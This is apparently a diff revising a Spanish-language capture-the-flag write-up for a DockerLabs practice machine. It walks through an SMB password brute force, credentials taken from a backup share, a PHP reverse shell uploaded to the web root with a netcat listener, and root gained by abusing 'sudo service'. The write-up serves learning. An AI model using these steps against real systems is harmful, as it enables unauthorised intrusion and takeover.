@@ -2,13 +2,14 @@ Propiedades:
 - OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
-- Tags: #dockerlabs #smb #brute-force
+- Tags: #smb #brute-force #reverse-shell #sudo-abuse
 
 ![](assets/Pasted%20image%2020251110203526.png)
 
 ## Reconocimiento
 
-Comienzo tirando un ping para comprobar conectividad:
+Comienzo tirando un ping para comprobar la conectividad.
+
 ```bash
 > ping -c 1 172.17.0.2
 PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
@@ -19,7 +20,8 @@ PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
 rtt min/avg/max/mdev = 3.274/3.274/3.274/0.000 ms
 ```
 
-Ahora comenzamos tirando un escaneo con nmap para ver que puertos están abiertos
+Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.
+
 ```bash
 > nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv 172.17.0.2
 -------------------------------------------------------------
@@ -31,10 +33,10 @@ PORT    STATE SERVICE      REASON
 MAC Address: 32:99:3C:A5:58:17 (Unknown)
 ```
 
-- Vemos el puerto 80 HTTP, 22 SSH,  139 y 445 SMB.
+- Puertos 22, 80, 139 y 445 abiertos.
 
+Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.
 
-Procedemos a tirar un segundo escaneo con nmap para ver que servicios y versiones están corriendo:
 ```bash
 > nmap -p 22,80,139,445 -sCV --min-rate 5000 -Pn -n -vvv -sS 172.17.0.2 -oN target.txt
 ---------------------------------------------------------------------------------------
@@ -56,18 +58,22 @@ MAC Address: 32:99:3C:A5:58:17 (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-- Puerto 22 SSH: OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
-- Puerto 80 HTTP: Apache httpd 2.4.58 ((Ubuntu))
-- Puerto 139 y 445:  Samba smbd 4.6.2
+- Puerto 22 SSH OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
+- Puerto 80 HTTP Apache httpd 2.4.58 (Ubuntu)
+- Puertos 139 y 445 SMB Samba smbd 4.6.2
 
 ## Enumeración
 
-**Puerto 80**
+### Puerto 80 HTTP
 
-- Simple pagina de login
+La página principal muestra un formulario de login simple.
+
 ![](assets/Pasted%20image%2020251110204129.png)
 
-Realizamos fuzzing para descubrir recursos:
+**Fuzzing de Directorios.**
+
+Utilizo `gobuster` para descubrir recursos en el servidor web.
+
 ```bash
 > gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://172.17.0.2/ -x html,php,py,js,txt,json
 ===============================================================
@@ -80,18 +86,22 @@ Starting gobuster in directory enumeration mode
 /index.php            (Status: 200) [Size: 3543]
 ```
 
-**Info.php**
+**info.php**
 
-- en _disable_functions_ no hay ninguna función deshabilitada
+El archivo `info.php` muestra la configuración de PHP. En la sección `disable_functions` no hay ninguna función deshabilitada, lo cual es útil para la ejecución de comandos.
+
 ![](assets/Pasted%20image%2020251110204600.png)
+
 **productos.php**
 
-- Es al parecer la pagina principal, voy a suponer que es aquí a donde te redirigue cuando te logeas.
+Esta página parece ser la principal de la aplicación, probablemente a donde redirige después del login.
+
 ![](assets/Pasted%20image%2020251110204745.png)
 
-**Puertos 139, 445 Servicio SMB**
+### Puertos 139 y 445 SMB
 
-Enumere los recursos compartidos disponibles con smbmap y me encuentro con un recurso read-only al cual puedo acceder
+Enumero los recursos compartidos disponibles con `smbmap`.
+
 ```bash
 > smbmap -H 172.17.0.2
 [+] IP: 172.17.0.2:445	Name: pressenter.hl                                     
@@ -103,9 +113,9 @@ Enumere los recursos compartidos disponibles con smbmap y me encuentro con un re
 	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
 ```
 
-Procedo a conectarme al recurso, y listar el contenido:
+- Tengo acceso de lectura al recurso `myshare`
 
-- Aquí es donde me encuentro un archivito llamdo _access.txt_
+Me conecto al recurso compartido `myshare`.
 
 ```bash
 > smbclient //172.17.0.2/myshare -N
@@ -115,7 +125,8 @@ Procedo a conectarme al recurso, y listar el contenido:
   access.txt                          N      956  Sun Oct  6 00:46:26 2024
 ```
 
-Bajo el archivo y lo inspecciono:
+Descargo y examino el archivo `access.txt`.
+
 ```bash
 smb: \> get access.txt
 smb: \> exit
@@ -123,10 +134,12 @@ smb: \> exit
 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhdHJpYW5pN0Blc2VlbWViLmRsIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MjgxNjAzNzMsImV4cCI6MTcyODE2Mzk3MywiandrIjp7Imt0eSI6IlJTQSIsIm4iOiI2MzU4NTI5OTgwNzk4MDM4NzI2MjQyMzYxMjc2NTg2NjE3MzU1MzUyMTMxNjU0ODI2NDI1ODg4NDkzNTU1NDYxNTIyNTc1NTAwNjY0ODY2MDM4OTY4ODMwNTk4OTY0NjUxOTQ2NDEzMzU4OTI1MzU2OTM4MDQwMTE1MjQzMDg4MTg0NTg1MzQxMzY5NTQyNTgxNTQwOTc3MjMzMjU0MTQxNzQ5NzczNDQyODkwNjc3ODY2MjI3NzUyMzEzMzg2OTk1NzA1ODAxNzM0NjA2NDE1NjkyNTM5MjAyNzc5OTczMjczODgyNTc1NTUwMTIwMDc4NjUzNDc0MTU1MjMyMjkwMDAxNjM4NTIwMTExNTUyNjE1NDkwMjQyOTYyMDA4MjYxNDI4NzA0MjAxNjcwOTg0NDUyMjY1NzcwNyIsImUiOjY1NTM3fX0.bQhS5qLCv5bf3sy-oHS7ZGcqqjk3LqyJ5bv-Jw6DIIoSIkmBtiocq07F7joOeKRxS3roWdHEuZUMeHQfWTHwRH7pHqCIBVJObdvHI8WR_Gac_MPYvwd6aSAoNExSlZft1-hXJUWbUIZ683JqEg06VYIap0Durih2rUio4Bdzv68JIo_3M8JFMV6kQTHnM3CElKy-UdorMbTxMQdUGKLk_4C7_FLwrGQse1f_iGO2MTzxvGtebQhERv-bluUYGU3Dq7aJCNU_hBL68EHDUs0mNSPF-f_FRtdENILwF4U14PSJiZBS3e5634i9HTmzRhvCGAqY00isCJoEXC1smrEZpg
 ```
 
-- El parecer es un token JWT pero que no me sirve de nada.
+- El contenido parece ser un token JWT, pero no es útil para la explotación.
 
+**Enumeración de Usuarios SMB.**
 
-Ahora, me decido por usar `enum4linux` para listar posibles usuarios del servicio SMB a los cuales yo pueda realizarles un ataque de fuerza bruta.
+Utilizo `enum4linux` para enumerar usuarios del servicio SMB.
+
 ```bash
 > enum4linux -a 172.17.0.2
 --------------------------------------------------------------------------------------------------------------
@@ -141,11 +154,13 @@ S-1-5-21-3519099135-2650601337-1395019858-1003 SAMBASERVER\satriani7 (Local User
 S-1-5-21-3519099135-2650601337-1395019858-1004 SAMBASERVER\administrador (Local User)
 ```
 
-- Nos interesa el user satriani7 y adminstrador
+- Usuarios de interés: `satriani7` y `administrador`
+
 ## Explotación
 
+### Brute Force SMB
 
-Con `netexec` realizamos un ataque de fuerza bruta al usuario `satriani7`
+Realizo un ataque de fuerza bruta contra el usuario `satriani7` utilizando `netexec`.
 
 ```bash
 > nxc smb 172.17.0.2 -u satriani7 -p /usr/share/wordlists/rockyou.txt
@@ -153,10 +168,10 @@ Con `netexec` realizamos un ataque de fuerza bruta al usuario `satriani7`
 SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent
 ```
 
-- Contraseña 50cent
+- Credenciales encontradas: `satriani7:50cent`
 
-Listo los recursos a los que tiene acceso satriani7
-- Aquí veo que tengo permisos de lectura al recurso _backup_
+Enumero los recursos SMB a los que tiene acceso `satriani7`.
+
 ```bash
 > smbmap -H 172.17.0.2 -u satriani7 -p 50cent
 [+] IP: 172.17.0.2:445	Name: pressenter.hl                                     
@@ -168,23 +183,26 @@ Listo los recursos a los que tiene acceso satriani7
 	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
 ```
 
-Entonces ahora me conecto al servicio smb al recurso backup24
+- Ahora tengo acceso de lectura al recurso `backup24`
+
+Me conecto al recurso `backup24` y exploro su contenido.
+
 ```bash
 > smbclient //172.17.0.2/backup24 -U satriani7%50cent
 ```
 
-Dentro del recurso _backup_, había un montón de directorios y archivos pero después de buscar me encontré con 2 archivos interesantes que procedi a descargar.
+Dentro del recurso encuentro múltiples directorios y archivos. Después de explorar, encuentro dos archivos interesantes en `/Documents/Personal`:
 
-- _credentials.txt_ - Path /Documents/Personal
-- _notes.txt_ - Path /Documents/Personal
+- `credentials.txt`
+- `notes.txt`
 
 ```bash
 > smb: \Documents\Personal\> get credentials.txt
 > smb: \Documents\Personal\> get notes.txt
-> 
 ```
 
-_credentials.txt_ tenia varias credenciales entre ellas la de administrador
+El archivo `credentials.txt` contiene varias credenciales, incluyendo las del administrador.
+
 ```bash
 > cat credentials.txt 
 # Archivo de credenciales
@@ -194,7 +212,10 @@ Este documento expone credenciales de usuarios, incluyendo la del usuario admini
     - Contraseña: Adm1nP4ss2024 
 ```
 
-Procedí a volver listar los recursos a los que tengo acceso pero ahora con el usuario administrador.
+- Credenciales: `administrador:Adm1nP4ss2024`
+
+Enumero los recursos a los que tiene acceso el usuario `administrador`.
+
 ```bash
 > smbmap -H 172.17.0.2 -u administrador -p Adm1nP4ss2024
 [+] IP: 172.17.0.2:445	Name: pressenter.hl                                     
@@ -206,12 +227,16 @@ Procedí a volver listar los recursos a los que tengo acceso pero ahora con el u
 	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
 ```
 
-Tengo acceso al recurso _home_ con permisos de lectura/escritura por lo cual procedo a conectarme.
+- Tengo permisos de lectura y escritura en el recurso `home`
+
+Me conecto al recurso `home`.
+
 ```bash
 > smbclient //172.17.0.2/home -U administrador%Adm1nP4ss2024
 ```
 
-Lo primero que hago es ver que recursos existen:
+Listo el contenido del recurso.
+
 ```bash
 > smb: \> ls
   .                                   D        0  Mon Nov 10 21:30:21 2025
@@ -223,22 +248,31 @@ Lo primero que hago es ver que recursos existen:
   styles.css                          N      263  Sun Oct  6 03:22:06 2024
 ```
 
-Al parecer todos estos recursos corresponden al servicio apache el cual corre por el puerto 80, por lo cual ahora se me ocurren 2 opciones.
+Podemos ver que estos archivos son identicos a los que encontramos mediante **Fuzzing** por lo cual esto quiere decir que seguramente esta sea la carpeta raiz de la web.
 
-- Crear una webshell, ya que el _info.php_ me indica que no hay ninguna función deshabilitado por lo cual podría ejecutar comandos en el navegador
-- Directamente entablarme una reverse_shell
+### Reverse Shell
 
-Me decido por la segundo opción. Por lo cual ahora me bajo la reverse-shell de PentestMonkey [Link](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) en mi sistema y la subo al SMB
+Descargo la reverse shell de [PentestMonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) y la subo al recurso `home` del SMB.
+
+- Tecnicamente, si el recurso `home` es la raiz de la web, todo lo que suba a este recurso se tiene que ver reflejado en la web.
+
 ```bash
 smb: \> put php-reverse-shell.php
 putting file php-reverse-shell.php as \php-reverse-shell.php (2681.0 kb/s) (average 1340.6 kb/s)
 ```
 
-Ahora, me pongo en escucha y me dirijo a la dirección donde debería de estar alojado mi reverse shell: `http://172.17.0.2/php-reverse-shell.php`
+Me pongo en escucha en mi máquina atacante.
 
 ```bash
 > sudo nc -nlvp 443
--------------------------------------------------------------------------------------------------------------------------
+listening on [any] 443 ...
+```
+
+Accedo a la reverse shell desde el navegador: `http://172.17.0.2/php-reverse-shell.php`
+
+Recibo la conexión y obtengo acceso al sistema.
+
+```bash
 Connection received on 172.17.0.2 56350
 Linux 0318689382b0 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64 x86_64 x86_64 GNU/Linux
  03:39:38 up  5:12,  0 user,  load average: 0.92, 1.14, 1.94
@@ -248,9 +282,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ whoami
 www-data
 ```
+
 ## Escalada de Privilegios
 
-Procedo a enumerar binarios con privilegios de SUDO:
+Enumero binarios que pueda ejecutar con privilegios elevados.
+
 ```bash
 www-data@0318689382b0:/$ sudo -l
 
@@ -258,16 +294,18 @@ User www-data may run the following commands on 0318689382b0:
     (ALL) NOPASSWD: /usr/sbin/service
 ```
 
-Encuentro el binario _service_ y con ayuda de GTFObins lo exploto.
+- Puedo ejecutar `service` como root sin contraseña.
+
+Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/service/) para encontrar formas de abusar de `service` con privilegios sudo.
+
 ```bash
 www-data@0318689382b0:/$ sudo /usr/sbin/service ../../bin/sh              
 # whoami
 root
 # id
 uid=0(root) gid=0(root) groups=0(root)
-
 ```
 
 ![](assets/Pasted%20image%2020251110214639.png)
 
-***PWNED*
+***PWNED***
